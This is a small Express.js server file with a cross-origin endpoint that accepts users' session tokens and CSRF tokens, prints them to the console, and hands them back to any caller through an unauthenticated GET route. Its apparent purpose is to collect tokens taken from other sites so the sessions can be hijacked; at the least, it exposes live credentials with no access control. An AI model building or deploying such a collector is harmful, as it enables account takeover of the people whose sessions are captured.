// File: server.js
import express from 'express';
import cors from 'cors';
import bodyParser from 'body-parser';

const app = express();
const PORT = 3001;

app.use(cors());
app.use(bodyParser.json());

// In-memory token store (use DB like MongoDB in production)
const tokenStore = new Map();

app.post('/submit-tokens', (req, res) => {
  const { username, sessionToken, csrfToken } = req.body;

  if (!username || !sessionToken || !csrfToken) {
    return res.status(400).json({ success: false, message: 'Missing fields' });
  }

  // Save tokens (replace with DB call)
  tokenStore.set(username, { sessionToken, csrfToken, timestamp: new Date() });

  console.log(`✅ Tokens received for ${username}`);
  console.log("Session:", sessionToken);
  console.log("CSRF:", csrfToken);
  res.status(200).json({ success: true, message: 'Tokens saved successfully' });
});

app.get('/tokens/:username', (req, res) => {
  const { username } = req.params;
  const data = tokenStore.get(username);

  if (!data) {
    return res.status(404).json({ success: false, message: 'No tokens found' });
  }

  res.json({ success: true, data });
});

app.listen(PORT, () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
});
